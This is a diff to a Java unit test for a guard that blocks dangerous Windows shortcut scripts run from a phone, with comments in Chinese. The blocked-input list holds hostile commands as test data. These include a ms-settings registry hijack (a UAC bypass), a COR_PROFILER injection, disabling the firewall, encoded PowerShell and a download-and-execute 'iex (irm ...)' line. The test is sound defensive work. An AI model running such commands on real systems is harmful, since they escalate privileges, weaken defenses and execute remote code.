@@ -133,9 +133,11 @@ public class ShortcutGuardTest {
     }
 
     @Test public void blockedBodiesCannotBeApproved() throws Exception {
+        // [插件 / C] 改：HKCU 普通键（reg add HKCU\Software\X、Set-ItemProperty HKCU:\Software\X）和 HKCU 下的代理设置
+        // 现在是普通用户能做的事，放行（移到下面的 ok 列表）；换成 HKCU 里能影响提权的键（B.3），这些仍不能批准
         String[] bad = {
-                "reg add HKCU\\Software\\X /v a /d 1 /f",
-                "Set-ItemProperty -Path 'HKCU:\\Software\\X' -Name a -Value 1",
+                "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d cmd.exe /f",
+                "Set-ItemProperty -Path 'HKCU:\\Environment' -Name COR_PROFILER -Value x",
                 "New-ItemProperty -Path HKLM:\\SOFTWARE\\X -Name a",
                 "netsh advfirewall set allprofiles state off",
                 "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
@@ -149,16 +151,22 @@ public class ShortcutGuardTest {
                 "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                 "$c=[Convert]::FromBase64String($x)",
                 "iex (irm https://example.com/a.ps1)",
-                "@echo off\r\nREM 改代理\r\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\r\n"};
+                "@echo off\r\nREM 改策略\r\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f\r\n",
+                "Start-Process powershell -Verb RunAs"};
         for (String b : bad) assertFalse(b, LinkPolicy.shortcutBodyBlocked(b).isEmpty());
         // UTF-16（记事本存的）也看得出来
-        byte[] u16 = ("\uFEFFreg add HKCU\\X /f").getBytes(StandardCharsets.UTF_16LE);
+        // [插件 / C] 改：例子从 HKCU\X（现在放行）换成 HKLM\X（要管理员，仍拦）；UTF-16 识别本身没变
+        byte[] u16 = ("\uFEFFreg add HKLM\\X /f").getBytes(StandardCharsets.UTF_16LE);
         assertTrue(LinkPolicy.decodeScript(u16).contains("reg add"));
         assertFalse(LinkPolicy.shortcutFacts("p.bat", u16, null, true).shortcutBlocked.isEmpty());
-        byte[] u16nobom = "reg add HKCU\\X /f".getBytes(StandardCharsets.UTF_16LE);
+        byte[] u16nobom = "reg add HKLM\\X /f".getBytes(StandardCharsets.UTF_16LE);
         assertFalse(LinkPolicy.shortcutFacts("p.bat", u16nobom, null, true).shortcutBlocked.isEmpty());
         for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n",
-                "Get-ChildItem $env:USERPROFILE\\Desktop | Remove-Item -WhatIf"})
+                "Get-ChildItem $env:USERPROFILE\\Desktop | Remove-Item -WhatIf",
+                // [C] 新：普通用户能做的事放行（HKCU 普通键 / HKCU 代理 / 注释里写到的词）
+                "reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path 'HKCU:\\Software\\X' -Name a -Value 1",
+                "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1",
+                "# 不要改 proxy / firewall，也不要 reg add HKLM\nStart-Process notepad", "<# netsh advfirewall 只是说明 #>\nStart-Process notepad"})
             assertEquals(ok, "", LinkPolicy.shortcutBodyBlocked(ok));
 
         // 守卫：完全访问 + 点了「以后直接执行」也不问、不批准、不执行，回带原因
@@ -178,7 +186,7 @@ public class ShortcutGuardTest {
         assertEquals("从没问过", 0, st.asked.size());
         assertTrue("没记进批准表", g.approvals().isEmpty());
         // 批准表里硬塞了它的哈希也不放
-        Path p = write(c, "seeded.ps1", "reg delete HKCU\\X /f");
+        Path p = write(c, "seeded.ps1", "reg delete HKLM\\X /f"); // [插件 / C] 改：HKCU → HKLM（HKCU 普通键现在放行）
         g.approve("seeded.ps1", LinkPolicy.sha256Hex(Files.readAllBytes(p)));
         assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, reason(g.check("phone", "shortcut_run", m("name", "seeded"))));
         // 界面：显示 blocked + 原因
@@ -398,7 +406,8 @@ public class ShortcutGuardTest {
             assertEquals(2, prompts.get());
             assertEquals("改过的没执行", 2, ran.size());
 
-            Files.writeString(Path.of(pcCfg.scriptsDir, "代理.ps1"), "Set-ItemProperty -Path 'HKCU:\\Software\\X' -Name ProxyEnable -Value 1");
+            // [插件 / C] 改：HKCU 普通键现在放行；换成要管理员的内容（HKLM）测「碰规则的不问」
+            Files.writeString(Path.of(pcCfg.scriptsDir, "代理.ps1"), "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\X' -Name ProxyEnable -Value 1");
             assertEquals(1, Cli.send(cli, "pc-lan", "shortcut_run", m("name", "代理"), out, 10));
             assertEquals("碰严格规则的不问", 2, prompts.get());
             String l = log.toString();
